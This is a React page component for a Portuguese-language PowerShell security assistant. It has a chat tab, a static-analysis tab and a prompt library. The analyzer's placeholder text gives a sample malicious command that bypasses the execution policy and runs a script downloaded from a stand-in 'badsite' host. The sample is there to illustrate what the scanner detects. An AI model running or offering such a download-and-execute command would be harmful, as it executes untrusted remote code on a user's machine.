'use client';

import React, { useState, useEffect, useRef } from 'react';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { 
  Terminal, Shield, Zap, Copy, Check, Play, AlertTriangle, 
  ArrowRight, Lock, Crown, Download, FileCode, CheckCircle, HelpCircle, RefreshCw
} from 'lucide-react';
import { useAuth } from '@/hooks/useAuth';

const API_URL = process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:8000';

interface ChatMessage {
  sender: 'user' | 'bot';
  text: string;
  timestamp: string;
  data?: any; // Analysed data, templates and scripts
}

export default function PowerShellBotPage() {
  const { user, loading: authLoading } = useAuth();
  const [activeTab, setActiveTab] = useState<'chat' | 'analyzer' | 'library'>('chat');
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  
  // Tab 1: Chat Input & History
  const [chatInput, setChatInput] = useState('');
  const [chatHistory, setChatHistory] = useState<ChatMessage[]>([
    {
      sender: 'bot',
      text: 'Saudações, operador! Eu sou o OrbePSShield. Estou aqui para ajudar você a projetar scripts e comandos PowerShell altamente seguros, mitigar riscos de segurança e gerar todos os wrappers de arquivos de produção necessários. Como posso apoiar suas operações hoje?',
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    }
  ]);
  
  // Tab 2: Code Analyzer Input
  const [analyzerInput, setAnalyzerInput] = useState('');
  const [analysisResult, setAnalysisResult] = useState<any>(null);

  // Active generated script file type tab
  const [activeScriptFormat, setActiveScriptFormat] = useState<'ps1' | 'bat' | 'sh' | 'json' | 'yml' | 'md'>('ps1');
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  
  // Active output data (for displaying in the file panel)
  const [currentOutputData, setCurrentOutputData] = useState<any>(null);

  const messagesEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    if (activeTab === 'chat') {
      scrollToBottom();
    }
  }, [chatHistory, activeTab]);

  // Unified fetch helper
  const callApi = async (endpoint: string, payload: any) => {
    const res = await fetch(`${API_URL}/api/powershell-bot${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
      credentials: 'include',
    });
    if (!res.ok) {
      if (res.status === 403) {
        throw new Error('Acesso restrito. Assinatura Premium ativa necessária.');
      }
      throw new Error(`Erro na API (${res.status})`);
    }
    return await res.json();
  };

  // Submit Prompt to Chat Bot
  const handleSendPrompt = async (forcedPrompt?: string) => {
    const promptToSend = forcedPrompt ?? chatInput;
    if (!promptToSend.trim()) return;

    if (!forcedPrompt) {
      setChatInput('');
    }

    // Append user message
    const userMsg: ChatMessage = {
      sender: 'user',
      text: promptToSend,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };
    setChatHistory(prev => [...prev, userMsg]);
    setLoading(true);
    setLoadingMessage('OrbePSShield está analisando políticas de segurança...');

    try {
      const data = await callApi('/chat', { prompt: promptToSend });
      
      const botMsg: ChatMessage = {
        sender: 'bot',
        text: data.explanation || 'Análise concluída com sucesso.',
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        data: data
      };

      setChatHistory(prev => [...prev, botMsg]);
      setCurrentOutputData(data);
      if (data.scripts) {
        // Automatically switch format to ps1 if scripts exist
        setActiveScriptFormat('ps1');
      }
    } catch (e: any) {
      setChatHistory(prev => [...prev, {
        sender: 'bot',
        text: `Erro operacional na consulta: ${e.message || 'Falha desconhecida'}`,
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
      }]);
    } finally {
      setLoading(false);
    }
  };

  // Run Static Code Analysis
  const handleAnalyzeScript = async () => {
    if (!analyzerInput.trim()) return;
    setLoading(true);
    setLoadingMessage('Executando varredura SAST no script PowerShell...');

    try {
      const data = await callApi('/analyze-script', { script_content: analyzerInput });
      setAnalysisResult(data);
    } catch (e: any) {
      alert(e.message || 'Falha ao processar análise do script.');
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const handleDownloadFile = (filename: string, content: string) => {
    if (!content) return;
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    a.remove();
    window.URL.revokeObjectURL(url);
  };

  // Library of Secure Templates
  const templateLibrary = [
    {
      title: "Cópia Segura de Diretórios",
      description: "Copia arquivos validando caminhos, registrando logs detalhados e tratando exceções de I/O.",
      prompt: "Crie um script PowerShell para copiar arquivos de uma pasta para outra de forma extremamente segura, com tratamento de erros try-catch, validando se a origem existe, criando o destino caso não exista e gerando logs."
    },
    {
      title: "Telemetria Passiva de Host",
      description: "Recupera dados do computador usando CIM/WMI de forma passiva, sem alterar registros ou políticas.",
      prompt: "Gere um script PowerShell passivo e amigável para extrair telemetria do sistema (uso de CPU, discos rígidos lógicos disponíveis com espaço livre e versão do Windows), formatando a saída de forma legível sem alterar nenhuma configuração."
    },
    {
      title: "Auditor e Download Seguro",
      description: "Baixa um arquivo web comparando o hash de integridade SHA256 e alertando contra cmdlets maliciosos.",
      prompt: "Escreva um script PowerShell para efetuar o download seguro de um arquivo de script remoto de forma temporária, auditar se ele contém cmdlets perigosos e validando o hash SHA-256 antes de rodar."
    },
    {
      title: "Check de Portas de Rede Ativo",
      description: "Testa conexões de sockets locais de forma segura, com limites de timeout estruturados.",
      prompt: "Escreva um script PowerShell amigável para testar a conectividade de portas de rede (Test-NetConnection) contra múltiplos servidores e portas especificados em um arquivo de configuração JSON, exibindo alertas caso haja falhas."
    }
  ];

  return (
    <div className="min-h-screen bg-terminal-bg flex flex-col">
      <Header />

      <main className="flex-1 max-w-7xl w-full mx-auto px-6 pt-24 pb-16 flex flex-col lg:flex-row gap-6">
        
        {/* Left Column: Control Panel and Navigation */}
        <aside className="w-full lg:w-72 flex-shrink-0 flex flex-col gap-4">
          
          {/* Logo & Identity Widget */}
          <div className="bg-terminal-surface/90 border border-terminal-border rounded-lg p-5 flex flex-col gap-3">
            <div className="flex items-center gap-3 mb-2 border-b border-terminal-border pb-3">
              <div className="w-7 h-7 rounded bg-neon-cyan/20 flex items-center justify-center text-neon-cyan">
                <Terminal size={15} />
              </div>
              <div>
                <h2 className="font-mono text-xs font-bold text-white uppercase tracking-widest">OrbePSShield</h2>
                <p className="font-mono text-[9px] text-neon-cyan tracking-widest uppercase">PowerShell Secure Bot</p>
              </div>
            </div>

            <button 
              onClick={() => setActiveTab('chat')}
              className={`flex items-center gap-3 w-full py-2.5 px-3 rounded font-mono text-[11px] uppercase tracking-wider transition-all duration-200 text-left
                ${activeTab === 'chat' 
                  ? 'bg-neon-cyan/10 border border-neon-cyan/40 text-neon-cyan' 
                  : 'text-terminal-muted hover:text-white hover:bg-white/5 border border-transparent'
                }`}
            >
              <Terminal size={14} />
              <span>Console Assistente</span>
            </button>

            <button 
              onClick={() => setActiveTab('analyzer')}
              className={`flex items-center gap-3 w-full py-2.5 px-3 rounded font-mono text-[11px] uppercase tracking-wider transition-all duration-200 text-left
                ${activeTab === 'analyzer' 
                  ? 'bg-neon-purple/10 border border-neon-purple/40 text-neon-purple' 
                  : 'text-terminal-muted hover:text-white hover:bg-white/5 border border-transparent'
                }`}
            >
              <Shield size={14} />
              <span>Analisador SAST</span>
            </button>

            <button 
              onClick={() => setActiveTab('library')}
              className={`flex items-center gap-3 w-full py-2.5 px-3 rounded font-mono text-[11px] uppercase tracking-wider transition-all duration-200 text-left
                ${activeTab === 'library' 
                  ? 'bg-neon-green/10 border border-neon-green/40 text-neon-green' 
                  : 'text-terminal-muted hover:text-white hover:bg-white/5 border border-transparent'
                }`}
            >
              <HelpCircle size={14} />
              <span>Biblioteca Prompts</span>
            </button>
          </div>

          {/* Telemetry Indicator Panel */}
          <div className="bg-terminal-surface/60 border border-terminal-border/50 rounded-lg p-5 font-mono text-[10px] text-terminal-muted space-y-2.5">
            <div className="flex justify-between items-center">
              <span>NÍVEL OPERACIONAL:</span>
              <span className="text-neon-cyan font-bold">SECURE SHELL</span>
            </div>
            <div className="flex justify-between items-center">
              <span>DEPLOYMENT AI:</span>
              <span className="text-neon-cyan font-bold">HYBRID / SELF-HOSTED</span>
            </div>
            <div className="flex justify-between items-center">
              <span>STATUS DO BOT:</span>
              <span className="text-neon-green flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-neon-green animate-pulse-neon" />
                ATIVO
              </span>
            </div>
            <div className="flex justify-between items-center">
              <span>ASSINATURA DE SEGURANÇA:</span>
              <span className="text-white">HMAC-SHA256</span>
            </div>
            <div className="flex justify-between items-center border-t border-terminal-border/20 pt-2.5 mt-1">
              <span>RISCO CRÍTICO BLOQUEADO:</span>
              <span className="text-red-400 font-bold">SIM</span>
            </div>
          </div>
          
        </aside>

        {/* Center/Right Column: Main Work Area */}
        <section className="flex-1 flex flex-col gap-6">
          
          {/* Main Content Area Container */}
          <div className="bg-terminal-surface/90 border border-terminal-border rounded-lg overflow-hidden flex flex-col shadow-[0_20px_50px_-10px_rgba(0,0,0,0.5)] flex-1 min-h-[500px]">
            
            {/* Terminal Tab Header */}
            <div className="bg-[#161b22] border-b border-terminal-border px-5 py-3 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-[#ff5f56]" />
                <span className="w-2.5 h-2.5 rounded-full bg-[#ffbd2e]" />
                <span className="w-2.5 h-2.5 rounded-full bg-[#27c93f]" />
                <span className="font-mono text-[10px] text-terminal-muted uppercase tracking-widest ml-3">
                  ORBE_PS_SHIELD // {activeTab.toUpperCase()}_CONSOLE.bat
                </span>
              </div>
              <div className="text-[10px] font-mono text-terminal-muted flex items-center gap-1.5 border border-terminal-border rounded px-2.5 py-1">
                <Lock size={10} className="text-neon-cyan" />
                <span>POLÍTICA DE ZERO-RETENÇÃO</span>
              </div>
            </div>

            {/* Content Switcher */}
            <div className="p-6 flex-1 flex flex-col">
              
              {/* TAB 1: CONSOLE ASSISTENTE */}
              {activeTab === 'chat' && (
                <div className="flex-1 flex flex-col justify-between gap-4 h-full">
                  
                  {/* Chat Message Logs */}
                  <div className="flex-1 overflow-y-auto max-h-[380px] space-y-4 pr-2 scrollbar-thin scrollbar-thumb-neon-cyan/10">
                    {chatHistory.map((msg, idx) => (
                      <div 
                        key={idx} 
                        className={`flex gap-3 p-4 rounded-lg border leading-relaxed ${
                          msg.sender === 'user'
                            ? 'bg-neon-cyan/5 border-neon-cyan/20 ml-12'
                            : 'bg-black/30 border-terminal-border/40 mr-12'
                        }`}
                      >
                        <div className="flex-shrink-0">
                          {msg.sender === 'user' ? (
                            <div className="w-6 h-6 rounded-full bg-neon-cyan/20 flex items-center justify-center font-mono text-[10px] text-neon-cyan font-bold border border-neon-cyan/40">
                              OP
                            </div>
                          ) : (
                            <div className="w-6 h-6 rounded-full bg-black flex items-center justify-center font-mono text-[10px] text-neon-cyan font-bold border border-neon-cyan/50">
                              🤖
                            </div>
                          )}
                        </div>

                        <div className="flex-1 space-y-3 font-mono text-xs">
                          <div className="flex justify-between items-center text-[9px] text-terminal-muted mb-1">
                            <span className="font-bold uppercase tracking-wider">
                              {msg.sender === 'user' ? 'Operador' : 'OrbePSShield'}
                            </span>
                            <span>{msg.timestamp}</span>
                          </div>
                          
                          <p className="text-white whitespace-pre-wrap">{msg.text}</p>
                          
                          {/* If message has security data, render safety report inline */}
                          {msg.data && (
                            <div className="border border-terminal-border/30 rounded mt-3 overflow-hidden bg-black/40">
                              
                              {/* Header safety title */}
                              <div className={`p-2 font-bold text-[10px] uppercase flex justify-between items-center border-b border-terminal-border/30 ${
                                msg.data.is_safe ? 'bg-green-500/10 text-green-400' : 'bg-red-500/10 text-red-400'
                              }`}>
                                <div className="flex items-center gap-1.5">
                                  {msg.data.is_safe ? <CheckCircle size={12} /> : <AlertTriangle size={12} />}
                                  <span>Avaliação de Risco Operacional</span>
                                </div>
                                <span className="px-1.5 py-0.5 rounded bg-black/30">SCORE: {msg.data.risk_score}/100</span>
                              </div>

                              <div className="p-3 space-y-2.5">
                                {/* Warnings list */}
                                {msg.data.warnings && msg.data.warnings.length > 0 && (
                                  <div className="space-y-1">
                                    <span className="text-[9px] text-red-400/80 font-bold uppercase tracking-wider">Alertas Detectados:</span>
                                    <ul className="list-disc pl-4 space-y-0.5 text-red-300/90 text-[10px]">
                                      {msg.data.warnings.map((w: string, i: number) => (
                                        <li key={i}>{w}</li>
                                      ))}
                                    </ul>
                                  </div>
                                )}

                                {/* Secured One-Liner Command */}
                                {msg.data.secured_command && (
                                  <div className="space-y-1 pt-1.5 border-t border-terminal-border/20">
                                    <span className="text-[9px] text-neon-cyan/80 font-bold uppercase tracking-wider">Comando Consolidado Seguro:</span>
                                    <div className="flex items-center justify-between gap-3 bg-black/50 border border-neon-cyan/20 p-2 rounded text-[10px] text-neon-cyan overflow-x-auto">
                                      <code className="whitespace-nowrap font-mono">{msg.data.secured_command}</code>
                                      <button 
                                        onClick={() => copyToClipboard(msg.data.secured_command, `sec-${idx}`)}
                                        className="text-terminal-muted hover:text-neon-cyan flex-shrink-0"
                                      >
                                        {copiedKey === `sec-${idx}` ? <Check size={12} className="text-neon-green" /> : <Copy size={12} />}
                                      </button>
                                    </div>
                                  </div>
                                )}
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                    
                    {loading && (
                      <div className="flex gap-3 p-4 rounded-lg bg-black/30 border border-terminal-border/40 mr-12 animate-pulse">
                        <div className="w-6 h-6 rounded-full bg-black flex items-center justify-center font-mono text-[10px] text-neon-cyan font-bold border border-neon-cyan/20 animate-spin">
                          <RefreshCw size={10} />
                        </div>
                        <div className="flex-1 space-y-2 font-mono text-xs">
                          <span className="text-[9px] text-terminal-muted uppercase tracking-wider">Auditando instrução...</span>
                          <p className="text-neon-cyan/60 italic">{loadingMessage}</p>
                        </div>
                      </div>
                    )}
                    <div ref={messagesEndRef} />
                  </div>

                  {/* Input form */}
                  <div className="flex gap-2 border-t border-terminal-border/40 pt-4 mt-2">
                    <input 
                      type="text" 
                      value={chatInput}
                      onChange={(e) => setChatInput(e.target.value)}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') handleSendPrompt();
                      }}
                      placeholder="Solicite um script ou pergunte como rodar um comando (ex: 'backup de pasta', 'como listar processos')..."
                      className="flex-1 bg-black/40 border border-terminal-border/60 focus:border-neon-cyan focus:outline-none px-4 py-3 font-mono text-xs rounded text-white"
                      disabled={loading}
                    />
                    <button 
                      onClick={() => handleSendPrompt()}
                      disabled={loading || !chatInput.trim()}
                      className="flex items-center gap-2 font-mono text-xs font-bold tracking-wider uppercase bg-neon-cyan/15 text-neon-cyan border border-neon-cyan/40 hover:bg-neon-cyan/25 hover:border-neon-cyan px-6 py-3 rounded transition-all duration-300 disabled:opacity-40 disabled:pointer-events-none"
                    >
                      <Play size={12} />
                      <span>Processar</span>
                    </button>
                  </div>

                </div>
              )}

              {/* TAB 2: ANALISADOR SAST */}
              {activeTab === 'analyzer' && (
                <div className="flex-1 flex flex-col gap-6 animate-fade-in">
                  <div>
                    <h1 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <Shield size={18} className="text-neon-purple" />
                      Análise Estática de Scripts PowerShell (.ps1)
                    </h1>
                    <p className="text-xs text-terminal-muted mt-1">
                      Cole seu script PowerShell abaixo para escanear chaves expostas, bypasses de políticas locais, desativações de defesas e cmdlets perigosos (SAST integrado).
                    </p>
                  </div>

                  <div className="flex flex-col gap-3">
                    <textarea 
                      value={analyzerInput}
                      onChange={(e) => setAnalyzerInput(e.target.value)}
                      rows={6}
                      placeholder="Cole o script PowerShell aqui... Ex:\nSet-ExecutionPolicy Bypass -Scope Process\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://badsite/payload.ps1')"
                      className="w-full bg-black/40 border border-terminal-border/60 hover:border-neon-purple/50 focus:border-neon-purple focus:outline-none p-4 font-mono text-xs rounded transition-colors text-white leading-relaxed"
                    />
                    <div className="flex justify-end">
                      <button 
                        onClick={handleAnalyzeScript}
                        disabled={loading || !analyzerInput.trim()}
                        className="flex items-center gap-2 font-mono text-xs font-bold tracking-wider uppercase bg-neon-purple/15 text-neon-purple border border-neon-purple/40 hover:bg-neon-purple/25 hover:border-neon-purple px-6 py-2.5 rounded transition-all duration-300 disabled:opacity-40 disabled:pointer-events-none"
                      >
                        <Play size={12} />
                        Analisar Script
                      </button>
                    </div>
                  </div>

                  {/* Analysis Output Result */}
                  {analysisResult && (
                    <div className="border border-terminal-border/40 bg-black/20 rounded-lg p-5 space-y-4 animate-fade-in-up">
                      
                      {/* Health Gauge & Score */}
                      <div className="flex flex-col sm:flex-row gap-5 justify-between items-start sm:items-center border-b border-terminal-border/20 pb-4">
                        <div className="space-y-1">
                          <h4 className="font-mono text-xs font-bold text-white uppercase tracking-wider">RESULTADO DA VARREDURA DE POLÍTICAS</h4>
                          <p className="font-mono text-[10px] text-terminal-muted">Integridade contra OWASP-SafePS &amp; MITRE Attack</p>
                        </div>
                        <div className="flex items-center gap-3">
                          <div className="text-right">
                            <div className="font-mono text-[10px] text-terminal-muted">RISCO DE SEGURANÇA</div>
                            <div className={`font-mono text-sm font-bold ${
                              analysisResult.risk_level === 'CRITICAL' || analysisResult.risk_level === 'HIGH' ? 'text-red-400' : 
                              analysisResult.risk_level === 'MEDIUM' ? 'text-yellow-400' : 'text-green-400'
                            }`}>
                              NÍVEL: {analysisResult.risk_level}
                            </div>
                          </div>
                          <div className={`w-14 h-14 rounded-full border-2 flex items-center justify-center font-mono text-base font-bold ${
                            analysisResult.security_score >= 80 ? 'border-green-500 text-green-400 bg-green-500/10' : 
                            analysisResult.security_score >= 55 ? 'border-yellow-500 text-yellow-400 bg-yellow-500/10' :
                            'border-red-500 text-red-400 bg-red-500/10'
                          }`}>
                            {analysisResult.security_score}
                          </div>
                        </div>
                      </div>

                      {/* Findings Table */}
                      <div className="space-y-3">
                        <h4 className="font-mono text-[10px] text-white font-bold uppercase tracking-wider">Vulnerabilidades Detectadas:</h4>
                        {analysisResult.findings && analysisResult.findings.length > 0 ? (
                          <div className="space-y-2.5 max-h-[200px] overflow-y-auto pr-1">
                            {analysisResult.findings.map((f: any, i: number) => (
                              <div key={i} className="bg-black/40 border border-terminal-border/30 rounded p-3 space-y-1.5 font-mono text-xs">
                                <div className="flex justify-between items-center">
                                  <span className="text-[10px] text-neon-purple font-bold bg-neon-purple/10 border border-neon-purple/30 px-1.5 py-0.5 rounded">
                                    {f.rule}
                                  </span>
                                  <span className={`text-[9px] font-bold px-1.5 py-0.2 rounded border ${
                                    f.severity === 'CRITICAL' ? 'bg-red-500/10 text-red-400 border-red-500/30' :
                                    f.severity === 'HIGH' ? 'bg-orange-500/10 text-orange-400 border-orange-500/30' :
                                    f.severity === 'MEDIUM' ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/30' :
                                    'bg-green-500/10 text-green-400 border-green-500/30'
                                  }`}>
                                    {f.severity}
                                  </span>
                                </div>
                                <p className="text-white text-[11px] leading-relaxed">{f.description}</p>
                                <div className="text-[9px] text-terminal-muted border-t border-terminal-border/10 pt-1 flex justify-between">
                                  <span>LINHA: {f.line}</span>
                                  <span className="text-neon-cyan/70 italic">Mitigação recomendada ativa</span>
                                </div>
                              </div>
                            ))}
                          </div>
                        ) : (
                          <div className="border border-dashed border-green-500/20 bg-green-500/5 p-4 rounded text-center text-green-400 font-mono text-xs">
                            [+] Nenhum vetor de ataque ou má prática padrão foi identificado no script. Status: Limpo.
                          </div>
                        )}
                      </div>

                    </div>
                  )}

                </div>
              )}

              {/* TAB 3: BIBLIOTECA DE PROMPTS */}
              {activeTab === 'library' && (
                <div className="flex-1 flex flex-col gap-6 animate-fade-in">
                  <div>
                    <h1 className="font-mono text-base font-bold text-white flex items-center gap-2">
                      <HelpCircle size={18} className="text-neon-green" />
                      Biblioteca de Prompts Seguros (DevSecOps)
                    </h1>
                    <p className="text-xs text-terminal-muted mt-1">
                      Modelos de prompts prontos recomendados para geração de scripts administrativos livres de falhas, formatados sob rígidos critérios de conformidade da Orbe Systems.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {templateLibrary.map((item, idx) => (
                      <div 
                        key={idx} 
                        className="bg-[#12161f]/40 border border-terminal-border hover:border-neon-green/40 p-4 rounded-lg flex flex-col justify-between gap-3 group transition-all duration-300"
                      >
                        <div className="space-y-1.5">
                          <h4 className="font-mono text-xs font-bold text-white group-hover:text-neon-green transition-colors">
                            {item.title}
                          </h4>
                          <p className="font-mono text-[10px] text-terminal-muted leading-relaxed">
                            {item.description}
                          </p>
                        </div>
                        <button 
                          onClick={() => {
                            setActiveTab('chat');
                            handleSendPrompt(item.prompt);
                          }}
                          className="flex items-center justify-center gap-1.5 font-mono text-[9px] text-neon-green/80 bg-neon-green/5 border border-neon-green/20 group-hover:bg-neon-green/15 py-1.5 rounded transition-all duration-200"
                        >
                          <span>Carregar no Assistente</span>
                          <ArrowRight size={10} />
                        </button>
                      </div>
                    ))}
                  </div>

                </div>
              )}

            </div>

          </div>

          {/* RIGHT/BOTTOM FILE VIEWING DASHBOARD (Dynamic output panel) */}
          {currentOutputData && currentOutputData.scripts && (
            <div className="bg-[#0d1117] border border-terminal-border rounded-lg overflow-hidden flex flex-col shadow-[0_20px_50px_-10px_rgba(0,0,0,0.7)] animate-fade-in-up">
              
              {/* Output Tab Header */}
              <div className="bg-[#161b22] border-b border-terminal-border px-4 py-2.5 flex items-center justify-between flex-wrap gap-2">
                <div className="flex items-center gap-2">
                  <FileCode size={14} className="text-neon-cyan" />
                  <span className="font-mono text-[10px] text-white font-bold uppercase tracking-widest">
                    PAINEL DE ARQUIVOS GERADOS
                  </span>
                </div>
                
                {/* Format selection */}
                <div className="flex gap-1.5 font-mono text-[9px]">
                  {Object.keys(currentOutputData.scripts).map((key) => {
                    const ext = key.toUpperCase();
                    return (
                      <button
                        key={key}
                        onClick={() => setActiveScriptFormat(key as any)}
                        className={`px-2.5 py-1 rounded border transition-colors ${
                          activeScriptFormat === key
                            ? 'bg-neon-cyan/10 border-neon-cyan text-neon-cyan'
                            : 'border-terminal-border text-terminal-muted hover:text-white bg-white/5'
                        }`}
                      >
                        .{ext}
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Code viewer body */}
              <div className="p-4 bg-black/40 flex-1 flex flex-col gap-3">
                <div className="flex justify-between items-center text-[10px] font-mono text-terminal-muted px-1.5">
                  <span>FORMATO DE ARQUIVO: .{activeScriptFormat.toUpperCase()}</span>
                  <div className="flex gap-3">
                    {/* Copy button */}
                    <button 
                      onClick={() => copyToClipboard(currentOutputData.scripts[activeScriptFormat], 'editor')}
                      className="flex items-center gap-1 hover:text-neon-cyan transition-colors"
                    >
                      {copiedKey === 'editor' ? (
                        <>
                          <Check size={11} className="text-neon-green" />
                          <span className="text-neon-green">Copiado!</span>
                        </>
                      ) : (
                        <>
                          <Copy size={11} />
                          <span>Copiar Código</span>
                        </>
                      )}
                    </button>
                    {/* Download button */}
                    <button 
                      onClick={() => handleDownloadFile(
                        activeScriptFormat === 'md' ? 'README_MANUAL.md' :
                        activeScriptFormat === 'json' ? 'config.json' :
                        activeScriptFormat === 'yml' ? 'pipeline.yml' :
                        activeScriptFormat === 'bat' ? 'run_wrapper.bat' :
                        activeScriptFormat === 'sh' ? 'unix_run.sh' :
                        'Secure-Command.ps1', 
                        currentOutputData.scripts[activeScriptFormat]
                      )}
                      className="flex items-center gap-1 hover:text-neon-cyan transition-colors"
                    >
                      <Download size={11} />
                      <span>Baixar Arquivo</span>
                    </button>
                  </div>
                </div>

                {/* Preformatted editor view */}
                <div className="relative border border-terminal-border/30 rounded-lg bg-black/60 p-4 max-h-[300px] overflow-y-auto scrollbar-thin scrollbar-thumb-neon-cyan/10">
                  <pre className="font-mono text-[10px] text-neon-cyan/90 leading-relaxed whitespace-pre-wrap">
                    <code>{currentOutputData.scripts[activeScriptFormat]}</code>
                  </pre>
                </div>
              </div>
            </div>
          )}

        </section>
      </main>

      <Footer />
    </div>
  );
}
